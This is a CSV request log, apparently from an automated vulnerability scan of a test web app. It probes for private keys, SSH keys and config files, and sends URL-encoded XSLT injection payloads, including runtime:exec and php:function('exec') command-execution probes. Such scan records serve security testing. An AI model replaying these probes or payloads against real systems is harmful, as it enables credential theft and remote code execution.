ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5266,Mon Sep 07 02:46:36 BDT 2026,Mon Sep 07 02:46:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/FileZilla.xml,404,Not Found,537,436,1090
5267,Mon Sep 07 02:46:36 BDT 2026,Mon Sep 07 02:46:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/winscp.ini,404,Not Found,533,436,1090
5268,Mon Sep 07 02:46:37 BDT 2026,Mon Sep 07 02:46:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/WinSCP.ini,404,Not Found,536,436,1090
5269,Mon Sep 07 02:46:37 BDT 2026,Mon Sep 07 02:46:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.DS_Store,404,Not Found,520,436,1090
5270,Mon Sep 07 02:46:38 BDT 2026,Mon Sep 07 02:46:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.php_cs.cache,404,Not Found,517,436,1090
5271,Mon Sep 07 02:46:38 BDT 2026,Mon Sep 07 02:46:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/DEADJOE,404,Not Found,524,436,1090
5272,Mon Sep 07 02:46:39 BDT 2026,Mon Sep 07 02:46:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/sites/default/private/files/backup_migrate/scheduled/test.txt,404,Not Found,528,436,1090
5273,Mon Sep 07 02:46:39 BDT 2026,Mon Sep 07 02:46:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/app/etc/local.xml,404,Not Found,536,436,1090
5274,Mon Sep 07 02:46:40 BDT 2026,Mon Sep 07 02:46:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/server.key,404,Not Found,532,436,1090
5275,Mon Sep 07 02:46:40 BDT 2026,Mon Sep 07 02:46:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/privatekey.key,404,Not Found,517,436,1090
5276,Mon Sep 07 02:46:41 BDT 2026,Mon Sep 07 02:46:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/myserver.key,404,Not Found,519,436,1090
5277,Mon Sep 07 02:46:41 BDT 2026,Mon Sep 07 02:46:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app/key.pem,404,Not Found,524,436,1090
5278,Mon Sep 07 02:46:42 BDT 2026,Mon Sep 07 02:46:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app/id_rsa,404,Not Found,523,436,1090
5279,Mon Sep 07 02:46:42 BDT 2026,Mon Sep 07 02:46:43 BDT 2026,GET,https://tfctest-002-production.up.railway.app/id_dsa,404,Not Found,517,436,1090
5280,Mon Sep 07 02:46:43 BDT 2026,Mon Sep 07 02:46:44 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.ssh/id_rsa,404,Not Found,535,436,1090
5281,Mon Sep 07 02:46:44 BDT 2026,Mon Sep 07 02:46:44 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.ssh/id_dsa,404,Not Found,537,436,1090
5282,Mon Sep 07 02:46:44 BDT 2026,Mon Sep 07 02:46:45 BDT 2026,GET,https://tfctest-002-production.up.railway.app/adminer.php,404,Not Found,555,436,1090
5283,Mon Sep 07 02:46:45 BDT 2026,Mon Sep 07 02:46:45 BDT 2026,GET,https://tfctest-002-production.up.railway.app/vb_test.php,404,Not Found,540,436,1090
5284,Mon Sep 07 02:46:45 BDT 2026,Mon Sep 07 02:46:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/CHANGELOG.txt,404,Not Found,507,436,1090
5285,Mon Sep 07 02:46:46 BDT 2026,Mon Sep 07 02:46:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/sites/default/files/.ht.sqlite,404,Not Found,551,436,1090
5286,Mon Sep 07 02:46:46 BDT 2026,Mon Sep 07 02:46:47 BDT 2026,GET,https://tfctest-002-production.up.railway.app/composer.json,404,Not Found,505,436,1090
5287,Mon Sep 07 02:46:47 BDT 2026,Mon Sep 07 02:46:47 BDT 2026,GET,https://tfctest-002-production.up.railway.app/composer.lock,404,Not Found,522,436,1090
5288,Mon Sep 07 02:46:47 BDT 2026,Mon Sep 07 02:46:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/vim_settings.xml,404,Not Found,517,436,1090
5289,Mon Sep 07 02:46:48 BDT 2026,Mon Sep 07 02:46:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/server-info,404,Not Found,636,436,1090
5290,Mon Sep 07 02:46:48 BDT 2026,Mon Sep 07 02:46:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/phpinfo.php,404,Not Found,524,436,1090
5291,Mon Sep 07 02:46:49 BDT 2026,Mon Sep 07 02:46:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/info.php,404,Not Found,561,436,1090
5292,Mon Sep 07 02:46:50 BDT 2026,Mon Sep 07 02:46:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/i.php,404,Not Found,579,436,1090
5293,Mon Sep 07 02:46:50 BDT 2026,Mon Sep 07 02:46:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/test.php,404,Not Found,533,436,1090
5294,Mon Sep 07 02:46:51 BDT 2026,Mon Sep 07 02:46:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_wpeprivate/config.json,404,Not Found,521,436,1090
5295,Mon Sep 07 02:46:51 BDT 2026,Mon Sep 07 02:46:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_framework/blazor.boot.json,404,Not Found,623,436,1090
5296,Mon Sep 07 02:46:52 BDT 2026,Mon Sep 07 02:46:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.hg,404,Not Found,522,436,1090
5297,Mon Sep 07 02:46:52 BDT 2026,Mon Sep 07 02:46:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.bzr,404,Not Found,524,436,1090
5298,Mon Sep 07 02:46:53 BDT 2026,Mon Sep 07 02:46:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/._darcs,404,Not Found,513,436,1090
5299,Mon Sep 07 02:46:53 BDT 2026,Mon Sep 07 02:46:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/BitKeeper,404,Not Found,533,436,1090
5300,Mon Sep 07 02:46:54 BDT 2026,Mon Sep 07 02:46:54 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,537,437,93
5301,Mon Sep 07 02:46:54 BDT 2026,Mon Sep 07 02:46:55 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,965,437,93
5302,Mon Sep 07 02:46:54 BDT 2026,Mon Sep 07 02:46:55 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,994,437,93
5303,Mon Sep 07 02:46:54 BDT 2026,Mon Sep 07 02:46:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,994,534,32438
5304,Mon Sep 07 02:46:54 BDT 2026,Mon Sep 07 02:46:55 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,996,437,93
5305,Mon Sep 07 02:46:54 BDT 2026,Mon Sep 07 02:46:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3C,200,OK,506,428,979
5306,Mon Sep 07 02:46:54 BDT 2026,Mon Sep 07 02:46:55 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,552,437,93
5307,Mon Sep 07 02:46:55 BDT 2026,Mon Sep 07 02:46:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,530,361,9
5308,Mon Sep 07 02:46:55 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,686,437,93
5309,Mon Sep 07 02:46:55 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,530,437,92
5310,Mon Sep 07 02:46:55 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,687,437,93
5311,Mon Sep 07 02:46:55 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,715,437,93
5312,Mon Sep 07 02:46:55 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,533,361,9
5313,Mon Sep 07 02:46:55 BDT 2026,Mon Sep 07 02:46:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,540,428,979
5314,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,548,437,93
5315,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,705,437,92
5316,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,720,437,92
5317,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,704,437,92
5318,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,535,361,9
5319,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:57 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,505,437,93
5320,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:57 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,660,437,93
5321,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:57 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,677,437,93
5322,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,535,428,979
5323,Mon Sep 07 02:46:56 BDT 2026,Mon Sep 07 02:46:57 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,689,437,93
5324,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:57 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,532,437,93
5325,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,698,437,93
5326,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,699,437,93
5327,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,559,437,93
5328,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,696,437,93
5329,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3C&_rsc=5CB68i4pnAekjehf,200,OK,529,428,274
5330,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,528,428,979
5331,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,516,437,93
5332,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,670,437,93
5333,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3C,200,OK,530,429,1033
5334,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,661,437,93
5335,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,678,437,93
5336,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,538,428,343
5337,Mon Sep 07 02:46:57 BDT 2026,Mon Sep 07 02:46:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3C,200,OK,702,429,1036
5338,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,649,437,93
5339,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,691,437,93
5340,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=system-property%28%27xsl%3Avendor%27%29%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,503,428,308
5341,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,676,437,93
5342,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,503,428,979
5343,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3C,200,OK,525,428,274
5344,Mon Sep 07 02:46:58 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,519,429,1033
5345,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=5CB68i4pnAekjehf,200,OK,522,428,358
5346,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,POST,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb,500,Internal Server Error,678,437,93
5347,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,POST,https://tfctest-002-production.up.railway.app/checkout,500,Internal Server Error,679,437,93
5348,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,POST,https://tfctest-002-production.up.railway.app/orders,500,Internal Server Error,696,437,93
5349,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:46:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,680,429,1036
5350,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=5CB68i4pnAekjehf,200,OK,517,428,349
5351,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,540,428,979
5352,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,517,435,271
5353,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,548,428,343
5354,Mon Sep 07 02:46:59 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,501,429,1033
5355,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,520,428,379
5356,Mon Sep 07 02:47:01 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,533,428,624
5357,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,488,428,979
5358,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3C,200,OK,534,429,1100
5359,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3C,200,OK,563,429,1101
5360,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,681,429,1036
5361,Mon Sep 07 02:47:01 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,533,429,1033
5362,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,517,428,308
5363,Mon Sep 07 02:47:01 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,529,428,373
5364,Mon Sep 07 02:47:00 BDT 2026,Mon Sep 07 02:47:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=%3C,200,OK,676,430,18158
5365,Mon Sep 07 02:47:01 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,525,428,979
5366,Mon Sep 07 02:47:01 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,526,429,1100
5367,Mon Sep 07 02:47:01 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,526,429,1101
5368,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,502,429,1033
5369,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,533,428,358
5370,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%3C,200,OK,501,428,282
5371,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,683,429,1036
5372,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,437,429,1101
5373,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3C,200,OK,503,429,1100
5374,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,518,429,1100
5375,Mon Sep 07 02:47:03 BDT 2026,Mon Sep 07 02:47:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,516,429,1033
5376,Mon Sep 07 02:47:03 BDT 2026,Mon Sep 07 02:47:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,522,428,349
5377,Mon Sep 07 02:47:03 BDT 2026,Mon Sep 07 02:47:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,524,428,282
5378,Mon Sep 07 02:47:03 BDT 2026,Mon Sep 07 02:47:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,671,429,1036
5379,Mon Sep 07 02:47:03 BDT 2026,Mon Sep 07 02:47:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,523,429,1101
5380,Mon Sep 07 02:47:03 BDT 2026,Mon Sep 07 02:47:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,519,429,1100
5381,Mon Sep 07 02:47:03 BDT 2026,Mon Sep 07 02:47:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,503,429,1100
5382,Mon Sep 07 02:47:02 BDT 2026,Mon Sep 07 02:47:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,706,430,18158
5383,Mon Sep 07 02:47:04 BDT 2026,Mon Sep 07 02:47:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,535,428,379
5384,Mon Sep 07 02:47:04 BDT 2026,Mon Sep 07 02:47:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,491,428,282
5385,Mon Sep 07 02:47:04 BDT 2026,Mon Sep 07 02:47:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,535,429,1033
5386,Mon Sep 07 02:47:04 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,525,429,1101
5387,Mon Sep 07 02:47:04 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,557,429,1100
5388,Mon Sep 07 02:47:05 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,536,429,1100
